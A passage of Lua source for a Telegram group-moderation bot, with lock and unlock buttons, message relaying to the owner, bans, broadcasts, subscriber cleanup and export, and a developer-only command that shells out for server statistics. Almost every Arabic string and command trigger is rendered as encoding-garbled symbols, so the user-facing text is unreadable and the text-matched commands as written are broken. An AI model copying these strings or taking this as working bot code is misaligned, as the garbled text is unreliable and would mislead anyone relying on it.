{text = 'ΩΩΩ Ψ§ΩΨ―Ψ?ΩΩ', callback_data=msg.sender_user_id_.."/lock_joine"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ―Ψ?ΩΩ', callback_data=msg.sender_user_id_.."/unlock_joine"},{text = 'ΩΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ', callback_data=msg.sender_user_id_.."/lockbots"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ', callback_data=msg.sender_user_id_.."/unlockbots"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ', callback_data=msg.sender_user_id_.."/locktags"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ', callback_data=msg.sender_user_id_.."/unlocktags"},{text = 'ΩΩΩ Ψ§ΩΨͺΨΉΨ―ΩΩ', callback_data=msg.sender_user_id_.."/lockedit"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΨΉΨ―ΩΩ', callback_data=msg.sender_user_id_.."/unlockedit"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/lockusername"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/unlockusername"},{text = 'ΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·', callback_data=msg.sender_user_id_.."/locklink"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·', callback_data=msg.sender_user_id_.."/unlocklink"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨͺΨ§Ω', callback_data=msg.sender_user_id_.."/locktag"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΨ§Ω', callback_data=msg.sender_user_id_.."/unlocktag"},{text = 'ΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/locksticar"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/unlocksticar"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΩΨ―ΩΩ', callback_data=msg.sender_user_id_.."/lockvideo"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΨ―ΩΩ', callback_data=msg.sender_user_id_.."/unlockvideo"},{text = 'ΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ', callback_data=msg.sender_user_id_.."/lockgif"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ', callback_data=msg.sender_user_id_.."/unlockgif"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ΅ΩΨ±', callback_data=msg.sender_user_id_.."/lockphoto"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨ±', callback_data=msg.sender_user_id_.."/unlockphoto"},{text = 'ΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ', callback_data=msg.sender_user_id_.."/lockvoise"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§ΨΊΨ§ΩΩ', callback_data=msg.sender_user_id_.."/unlockvoise"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ΅ΩΨͺ', callback_data=msg.sender_user_id_.."/lockaudo"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨͺ', callback_data=msg.sender_user_id_.."/unlockaudo"},{text = 'ΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ', callback_data=msg.sender_user_id_.."/lockfwd"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΩΨ¬ΩΩ', callback_data=msg.sender_user_id_.."/unlockfwd"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/lockfile"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/unlockfile"},{text = 'ΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/lockphone"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ¬ΩΨ§Ψͺ', callback_data=msg.sender_user_id_.."/unlockphone"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄', callback_data=msg.sender_user_id_.."/lockposts"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΩΨ§ΩΨ΄', callback_data=msg.sender_user_id_.."/unlockposts"},{text = 'ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ±', callback_data=msg.sender_user_id_.."/lockflood"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΩΨ±Ψ§Ψ±', callback_data=msg.sender_user_id_.."/unlockflood"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ', callback_data=msg.sender_user_id_.."/lockfarse"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ', callback_data=msg.sender_user_id_.."/unlockfarse"},{text = 'ΩΩΩ Ψ§ΩΨ³Ψ¨', callback_data=msg.sender_user_id_.."/lockfshar"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ³Ψ¨', callback_data=msg.sender_user_id_.."/unlockfshar"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω', callback_data=msg.sender_user_id_.."/lockchat"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω', callback_data=msg.sender_user_id_.."/unlockchat"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Texti).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if not Devss(msg) and not database:sismember(bot_id..'BaN:In:User',msg.sender_user_id_) and not database:get(bot_id..'Texting:In:Bv') then
send(msg.sender_user_id_,msg.id_,'Ω­ ΨͺΩΨͺ Ψ§Ψ±Ψ³Ψ§Ω Ψ±Ψ³Ψ§ΩΨͺΩ Ψ§ΩΩ ~ ['..UserName..']') 
tdcli_function({ID ="GetChat",chat_id_=Id_Sudo},function(arg,chat) 
tdcli_function({ID ="GetChat",chat_id_=msg.sender_user_id_},function(arg,chat) 
tdcli_function({ID="ForwardMessages",chat_id_=Id_Sudo,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,ta) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
sendText(Id_Sudo,'Ω­ ΨͺΩ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΩΩΨ΅Ω ΩΩ ~ ['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')',0,'md') 
return false
end;end;end,nil);end,nil);end,nil);end,nil);end
if Devss(msg) and msg.reply_to_message_id_ ~= 0 then 
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then 
id_user = result.forward_info_.sender_user_id_ 
end 
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'Ψ­ΨΈΨ±' then
sendText(Id_Sudo,'Ω­ ΩΨ΄Ψ?Ψ΅ Β» ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\nΩ­ ΨͺΩ Ψ­ΨΈΨ±Ω ΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω ',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'BaN:In:User',data.id_) 
return false 
end 
if text =='Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ­ΨΈΨ±' then
sendText(Id_Sudo,'Ω­ Ψ§ΩΨ΄Ψ?Ψ΅ Β» ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\nΩ­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±Ω ΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω ',msg.id_/2097152/0.5,'md')
database:srem(bot_id..'BaN:In:User',data.id_) 
return false 
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = { ID = "SendMessageTypingAction", progress_ = 100} },function(arg,ta) 
if ta.code_ == 400 or ta.code_ == 5 then
send(msg.chat_id_, msg.id_,'\nΩ­ ΩΨ΄Ω Ψ§Ψ±Ψ³Ψ§Ω Ψ±Ψ³Ψ§ΩΨͺΩ ΩΨ§Ω Ψ§ΩΨΉΨΆΩ ΩΨ§Ω Ψ¨Ψ­ΨΈΨ± Ψ§ΩΨ¨ΩΨͺ') 
return false 
end 
if text then 
send(id_user,msg.id_,text) 
Text = 'Ω­ ΨͺΩΨͺ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ±Ψ³Ψ§ΩΩ Ψ§ΩΩΩ .. '
elseif msg.content_.ID == 'MessageSticker' then 
sendSticker(id_user, msg.id_, msg.content_.sticker_.sticker_.persistent_id_) 
Text = 'Ω­ ΨͺΩΨͺ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΩΩΨ΅Ω Ψ§ΩΩΩ .. '
elseif msg.content_.ID == 'MessagePhoto' then 
sendPhoto(id_user, msg.id_,msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or '')) 
Text = 'Ω­ ΨͺΩΨͺ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ΅ΩΨ±Ω Ψ§ΩΩΩ .. '
elseif msg.content_.ID == 'MessageAnimation' then 
sendDocument(id_user, msg.id_, msg.content_.animation_.animation_.persistent_id_) 
Text = 'Ω­ ΨͺΩΨͺ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΩΨͺΨ­Ψ±ΩΩ Ψ§ΩΩΩ .. '
elseif msg.content_.ID == 'MessageVoice' then 
sendVoice(id_user, msg.id_, msg.content_.voice_.voice_.persistent_id_) 
Text = 'Ω­ ΨͺΩΨͺ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ¨Ψ΅ΩΩ Ψ§ΩΩΩ .. '
end 
sendText(Id_Sudo,Text..'\n'..'Ω­ ~ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil);end,nil);end,nil);end,nil);end 
if Devss(msg) then
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω Ω­' then 
database:del(bot_id..'Texting:In:Bv') 
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω ') 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω Ω­' then 
database:set(bot_id..'Texting:In:Bv',true) 
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω ') 
end
if text == 'ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΨ³ΩΨ±ΩΨ± Ω­' then
 ioserver = io.popen([[
 linux_version=`lsb_release -ds`
 memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
 HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
 CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
 uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
 echo 'Ω­ { ΩΨΈΨ§Ω Ψ§ΩΨͺΨ΄ΨΊΩΩ } β°β’\n*Β»Β» '"$linux_version"'*' 
 echo '*------------------------------\n*Ω­ { Ψ§ΩΨ°Ψ§ΩΨ±Ω Ψ§ΩΨΉΨ΄ΩΨ§Ψ¦ΩΩ } β°β’\n*Β»Β» '"$memUsedPrc"'*'
 echo '*------------------------------\n*Ω­ { ΩΨ­ΩΨ―Ω Ψ§ΩΩΨͺΩΨ?ΩΨ²ΩΩΩ } β°β’\n*Β»Β» '"$HardDisk"'*'
 echo '*------------------------------\n*Ω­ { Ψ§ΩΩΩΩΩΨΉΩΩΨ§ΩΩΩΨ¬ } β°β’\n*Β»Β» '"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
 echo '*------------------------------\n*Ω­ { ΩΩΩΩΨΉ Ψ§ΩΩΨ³ΩΩΩΨ±ΩΩΨ± } β°β’\n*Β»Β» '`curl http://th3boss.com/ip/location`'*'
 echo '*------------------------------\n*Ω­ { Ψ§ΩΩΩΨ―Ψ?ΩΩΩΩ } β°β’\n*Β»Β» '`whoami`'*'
 echo '*------------------------------\n*Ω­ { ΩΩΨ―Ω ΨͺΩΨ΄ΨΊΩΩΩ Ψ§ΩΩΨ³ΩΩΩΨ±ΩΩΨ± } β°β’ \n*Β»Β» '"$uptime"'*'
 ]]):read('*all')
 send(msg.chat_id_, msg.id_,ioserver)
 return false
 end
if text =='Ψ¬ΩΨ¨ Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ Ω­' and DevBot(msg) then
local list = database:smembers(bot_id..'UsersBot')  
local t = '{"users":['  
for k,v in pairs(list) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end
t = t..']}'
local File = io.open('./users.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_, './users.json', 'ΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ :'..#list)
end
if text == 'ΨͺΨΊΩΩΨ± Ψ΄ΩΩ Ψ§ΩΨ³ΩΨ±Ψ³ Ω­' and DevSonic(msg) then
database:set(bot_id..'NightRang:new:sourse'..msg.chat_id_..msg.sender_user_id_,'true1') 
send2(msg.chat_id_, msg.id_, 'Ψ§Ψ±Ψ³Ω Ψ±ΩΨ² Ψ¨Ψ―ΩΨ§ ΨΉΩ ΩΨ§Ψ°Ψ§ \n β β β β β β β β')
return false
end
if database:get(bot_id..'NightRang:new:sourse'..msg.chat_id_..msg.sender_user_id_) == 'true1' then
database:set(bot_id..'NightRang:new:sourse1',text)
send2(msg.chat_id_, msg.id_, 'Ψ§ΩΨ§Ω Ψ§Ψ±Ψ³Ω Ψ±ΩΨ² Ψ¨Ψ―ΩΨ§ ΨΉΩ Ω­ ')
database:set(bot_id..'NightRang:new:sourse'..msg.chat_id_..msg.sender_user_id_,'true2') 
return false
end
if database:get(bot_id..'NightRang:new:sourse'..msg.chat_id_..msg.sender_user_id_) == 'true2' then
database:set(bot_id..'NightRang:new:sourse2',text)
database:del(bot_id..'NightRang:new:sourse'..msg.chat_id_..msg.sender_user_id_) 
send(msg.chat_id_, msg.id_, 'ΨͺΩ ΨͺΨΊΩΨ± Ψ΄ΩΩ Ψ§ΩΨ³ΩΨ±Ψ³')
return false
end
if text == 'Ψ­Ψ°Ω Ψ΄ΩΩ Ψ§ΩΨ³ΩΨ±Ψ³ Ω­' and DevSonic(msg) then
database:del(bot_id..'NightRang:new:sourse1')
database:del(bot_id..'NightRang:new:sourse2')
send(msg.chat_id_, msg.id_, 'ΨͺΩ Ψ­Ψ°Ω ΨͺΨΊΩΨ± Ψ΄ΩΩ Ψ§ΩΨ³ΩΨ±Ψ³')
end
if text == 'Ψ΄ΩΩ Ψ§ΩΨ³ΩΨ±Ψ³ Ω­' then 
local Text = 'Ω­ ΩΨ±Ψ­Ψ¨Ψ§ Ψ¨Ω ΩΩ Ψ§ΩΨ§ΩΨ± Ψ΄ΩΩ Ψ§ΩΨ³ΩΨ±Ψ³'
local keyboard = {
{'ΨͺΨΊΩΩΨ± Ψ΄ΩΩ Ψ§ΩΨ³ΩΨ±Ψ³ Ω­','Ψ­Ψ°Ω Ψ΄ΩΩ Ψ§ΩΨ³ΩΨ±Ψ³ Ω­'},
{'ΨΉΩΨ―Ω Ω­'}
}
send_inline_key(msg.chat_id_,Text,keyboard)
end
if text =='Ψ§ΩΨ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ Ω­' then
local Groups = database:scard(bot_id..'Chek:Groups') 
local Users = database:scard(bot_id..'UsersBot') 
send(msg.chat_id_, msg.id_,'Ω­ Ψ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ Ψ§ΩΨ¨ΩΨͺ \n\nΩ­ ΨΉΨ―Ψ― Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ *~ '..Groups..'\nΩ­ ΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ ~ '..Users..'*')
end
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΩΨ³Ψ?Ω Ψ§ΩΨͺΩΩΨ§Ψ¦ΩΩ β’' then
database:del(bot_id.."AutoFile")
send(msg.chat_id_, msg.id_,"β«: ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΩΨ³Ψ?Ω Ψ§ΩΨ§Ψ­ΨͺΩΨ§Ψ·ΩΩ Ψ§ΩΨͺΩΩΨ§Ψ¦ΩΩ .") 
return false
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨ³Ψ?Ω Ψ§ΩΨͺΩΩΨ§Ψ¦ΩΩ β’" then  
database:set(bot_id.."AutoFile",true) 
send(msg.chat_id_, msg.id_,"β«: ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨ³Ψ?Ω Ψ§ΩΨ§Ψ­ΨͺΩΨ§Ψ·ΩΩ Ψ§ΩΨͺΩΩΨ§Ψ¦ΩΩ .") 
return false  
end
if text == "ΨͺΩΨΈΩΩ Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ Ω­" then
local pv = database:smembers(bot_id..'UsersBot') 
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = pv[i], action_ = { ID = "SendMessageTypingAction", progress_ = 100} },function(arg,data) 
if data.ID and data.ID == "Ok" then
print('\27[30;33mΒ»Β» THE USER IS SAVE ME β\nΒ»Β» '..pv[i]..'\n\27[1;37m')
else
print('\27[30;31mΒ»Β» THE USER IS BLOCK ME β\nΒ»Β» '..pv[i]..'\n\27[1;37m')
database:srem(bot_id..'UsersBot',pv[i]) 
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ΄ΨͺΨ±ΩΩΩ ΩΩΩΩΩΩ') 
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'*Ω­ ΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ Ψ§ΩΨ§Ω ~ '..#pv..'\nΩ­ ΨͺΩ Ψ§ΩΨΉΨ«ΩΨ± ΨΉΩΩ ~ '..sendok..' ΩΨ΄ΨͺΨ±Ω ΩΨ§Ω Ψ¨Ψ­ΨΈΨ± Ψ§ΩΨ¨ΩΨͺ\nΩ­ Ψ§Ψ΅Ψ¨Ψ­ ΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ Ψ§ΩΨ§Ω ~ '..ok..' ΩΨ΄ΨͺΨ±Ω *') 
end
end
end,nil)
end,nil)
end
return false
end
if text == 'ΩΨ­ΩΩΨ―' then 
local Text = [[ 
DEV MAHMOUD β
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'ΩΨ·ΩΨ± Ψ­ΩΨ―Ψ§ βοΈ', url="t.me/MahmoudM2"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'Ψ³ΩΩΩΩ' then 
local Text = [[ 
DEV SONIC β
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'SONIC βοΈ', url="t.me/uu_iv"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "ΨͺΩΨΈΩΩ Ψ§ΩΨ¬Ψ±ΩΨ¨Ψ§Ψͺ Ω­" then
local group = database:smembers(bot_id..'Chek:Groups') 
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
print('\27[30;34mΒ»Β» THE BOT IS NOT ADMIN β\nΒ»Β» '..group[i]..'\n\27[1;37m')
database:srem(bot_id..'Chek:Groups',group[i]) 
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',group[i]) 
q = q + 1
print('\27[30;35mΒ»Β» THE BOT IS LEFT GROUP β\nΒ»Β» '..group[i]..'\n\27[1;37m')
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',group[i]) 
q = q + 1
print('\27[30;36mΒ»Β» THE BOT IS KICKED GROUP β\nΒ»Β» '..group[i]..'\n\27[1;37m')
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'Ω­ ΩΨ§ ΨͺΩΨ¬Ψ― ΩΨ¬ΩΩΨΉΨ§Ψͺ ΩΩΩΩΩ ') 
else
local mahmoud = (w + q)
local sendok = #group - mahmoud
if q == 0 then
mahmoud = ''
else
mahmoud = '\nΩ­ ΨͺΩ Ψ§Ψ²Ψ§ΩΨ© ~ '..q..' ΩΨ¬ΩΩΨΉΨ§Ψͺ ΩΩ Ψ§ΩΨ¨ΩΨͺ'
end
if w == 0 then
storm = ''
else
storm = '\nΩ­ ΨͺΩ Ψ§Ψ²Ψ§ΩΨ© ~'..w..' ΩΨ¬ΩΩΨΉΩ ΩΨ§Ω Ψ§ΩΨ¨ΩΨͺ ΨΉΨΆΩ'
end
send(msg.chat_id_, msg.id_,'*Ω­ ΨΉΨ―Ψ― Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ Ψ§ΩΨ§Ω ~ '..#group..' ΩΨ¬ΩΩΨΉΩ '..storm..''..mahmoud..'\nΩ­ Ψ§Ψ΅Ψ¨Ψ­ ΨΉΨ―Ψ― Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ Ψ§ΩΨ§Ω ~ '..sendok..' ΩΨ¬ΩΩΨΉΨ§Ψͺ*\n') 
end
end
end,nil)
end
return false
end
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ Ω­' then
database:del(bot_id..'Free:Add:Bots') 
send(msg.chat_id_, msg.id_,'\nΩ­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ ') 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ Ω­' then
database:set(bot_id..'Free:Add:Bots',true) 
send(msg.chat_id_, msg.id_,'\nΩ­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ') 
end
if text=="Ψ§Ψ°Ψ§ΨΉΩ Ψ?Ψ§Ψ΅ Ω­" and msg.reply_to_message_id_ == 0 then
if database:get(bot_id.."Status:Bc") and not Devss(msg) then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΨΉΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
database:setex(bot_id.."Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω ΩΩ Ψ³ΩΨ§Ψ‘ ~ { ΩΩΨ΅Ω, ΩΨͺΨ­Ψ±ΩΩ, Ψ΅ΩΨ±Ω, Ψ±Ψ³Ψ§ΩΩ }\nΩ­ ΩΩΨ?Ψ±ΩΨ¬ Ψ§Ψ±Ψ³Ω Ψ§ΩΨΊΨ§Ψ‘ ") 
return false
end 
if text=="Ψ§Ψ°Ψ§ΨΉΩ Ω­" and msg.reply_to_message_id_ == 0 then
if database:get(bot_id.."Status:Bc") and not Devss(msg) then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΨΉΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
database:setex(bot_id.."Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω ΩΩ Ψ³ΩΨ§Ψ‘ ~ { ΩΩΨ΅Ω, ΩΨͺΨ­Ψ±ΩΩ, Ψ΅ΩΨ±Ω, Ψ±Ψ³Ψ§ΩΩ }\nΩ­ ΩΩΨ?Ψ±ΩΨ¬ Ψ§Ψ±Ψ³Ω Ψ§ΩΨΊΨ§Ψ‘ ") 
return false
end 
if text=="Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ Ω­" and msg.reply_to_message_id_ == 0 then
if database:get(bot_id.."Status:Bc") and not Devss(msg) then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΨΉΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
database:setex(bot_id.."Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ Ψ§ΩΨ§Ω") 
return false
end 
if text=="Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ Ψ?Ψ§Ψ΅ Ω­" and msg.reply_to_message_id_ == 0 then
if database:get(bot_id.."Status:Bc") and not Devss(msg) then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΨΉΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
database:setex(bot_id.."Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ Ψ§ΩΨ§Ω") 
return false
end 
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ω­" then
database:del(bot_id.."Status:Bc") 
send(msg.chat_id_, msg.id_,"\nΩ­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ " ) 
return false
end 
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ω­" then
database:set(bot_id.."Status:Bc",true) 
send(msg.chat_id_, msg.id_,"\nΩ­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ") 
return false
end 
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω Ω­" then
database:del(bot_id.."Left:Bot"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΩΨΉΩΩ ΩΨΊΨ§Ψ―Ψ±Ψ© Ψ§ΩΨ¨ΩΨͺ") 
return false 
end
if text == "ΨͺΨΊΩΨ± Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ Ω­" then 
if Devss(msg) then
database:setex(bot_id.."Set:Name:Bot"..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΨ§Ψ³Ω Ψ§ΩΨ§Ω ") 
end
return false
end
